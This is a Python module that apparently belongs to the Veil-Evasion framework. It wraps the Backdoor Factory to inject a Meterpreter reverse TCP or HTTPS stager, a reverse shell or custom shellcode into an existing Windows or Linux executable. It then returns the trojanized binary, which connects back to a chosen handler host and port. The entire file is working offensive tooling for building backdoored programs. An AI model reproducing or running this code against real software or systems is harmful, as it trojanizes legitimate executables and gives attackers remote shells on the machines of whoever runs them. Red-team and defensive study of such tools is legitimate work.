"""

Automates running the Backdoor Factory on an existing .exe

More information from
        Joshua Pitts - https://github.com/secretsquirrel/the-backdoor-factory

"""

import sys, time, subprocess
import shutil
from modules.common import helpers
from modules.common import shellcode
from tools.backdoor import pebin
from tools.backdoor import elfbin

# the main config file
import settings

class Payload:

    def __init__(self):
        # required options
        self.description = "Import of the BackdoorFactory"
        self.description +=" Supports PE and ELF file formats"
	self.description +=" Author: Joshua Pitts @midnite_runr"
	self.language = "native"
        self.rating = "Normal"
	self.extension = ""
	self.type = ""
        self.shellcode = shellcode.Shellcode()

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"orig_exe"     : ["psinfo.exe", "PE or ELF executable to run through the Backdoor Factory"],
                                 "payload"          : ["meter_tcp","PE or ELF: meter_tcp, rev_shell, custom | PE only meter_https"],
                                 "LHOST"            : ["127.0.0.1", "IP of the metasploit handler"],
                                 "LPORT"            : ["4444", "Port of the metasploit handler"]}


    def basicDiscovery(self):
        testBinary = open(self.required_options["orig_exe"][0], 'rb')
	header = testBinary.read(8)
	testBinary.close()
	if 'MZ' in header:
	    self.type = 'PE'
	elif 'ELF' in header:
	    self.type = 'ELF'
	else:
	    raise IOError
            print "\nBDF only supports intel 32/64bit PE and ELF binaries:\n" + helpers.color(stdout, warning=True)
            raw_input("\n[>] Press any key to return to the main menu:")
            return ""



    def generate(self):
	#Because of calling BDF via classes, obsolute paths change
	if self.required_options["orig_exe"][0] == "psinfo.exe":
	   self.required_options["orig_exe"][0] = settings.VEIL_EVASION_PATH + "testbins/psinfo.exe"
	
	#Make sure the bin is supported
	self.basicDiscovery()

           
	if self.required_options["payload"][0] == "custom":

            Shellcode = self.shellcode.generate()

            raw = Shellcode.decode("string_escape")
            
            f = open(settings.TEMP_DIR + "shellcode.raw", 'wb')
            f.write(raw)
            f.close()
	    print "shellcode", settings.TEMP_DIR + "shellcode.raw"
	    #invoke the class for the associated binary
	    if self.type == 'PE':
		targetFile = pebin.pebin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe', SHELL='user_supplied_shellcode', SUPPLIED_SHELLCODE=settings.TEMP_DIR + "shellcode.raw")
                self.extension = "exe"
	    
	    else:
		targetFile = elfbin.elfbin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe', SHELL='user_supplied_shellcode', SUPPLIED_SHELLCODE=settings.TEMP_DIR + "shellcode.raw") 
        	self.extension = ""

        else:

            shellcodeChoice = ""
            if self.required_options["payload"][0] == "meter_tcp":
                shellcodeChoice = "reverse_tcp_stager"
            elif self.required_options["payload"][0] == "meter_https" and self.type == "PE":
                shellcodeChoice = "meterpreter_reverse_https"
            elif self.required_options["payload"][0] == "rev_shell":
                shellcodeChoice = "reverse_shell_tcp"
            else:
                print helpers.color("\n [!] Please enter a valid payload choice.", warning=True)
                raw_input("\n [>] Press any key to return to the main menu:")
                return ""

            # invoke the class for the associated binary
	    if self.type == 'PE':
		targetFile = pebin.pebin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe', SHELL=shellcodeChoice, HOST=self.required_options["LHOST"][0], PORT=int(self.required_options["LPORT"][0]))
            	self.extension = "exe"
	    else:
                targetFile = elfbin.elfbin(FILE=self.required_options["orig_exe"][0], OUTPUT='payload.exe',  SHELL=shellcodeChoice, HOST=self.required_options["LHOST"][0], PORT=int(self.required_options["LPORT"][0])) 
		self.extension = ""

        print helpers.color("\n[*] Running The Backdoor Factory...")

        try:
	    #PATCH STUFF
	    targetFile.run_this()
            
	    #Because shits fast yo
	    time.sleep(4)
	    
	    # read in the output .exe from /tmp/
            f = open(settings.VEIL_EVASION_PATH+"backdoored/payload.exe", 'rb')
            PayloadCode = f.read()
            f.close()

        except IOError:
            print "\nError during The Backdoor Factory execution:\n" + helpers.color(stdout, warning=True)
            raw_input("\n[>] Press any key to return to the main menu:")
            return ""

	try:
	    #remove backdoored/ in VEIL root
	    shutil.rmtree(settings.VEIL_EVASION_PATH+'backdoored')

        except Exception as e:
	    print str(e)
	    #quiet failure
	    pass

	return PayloadCode
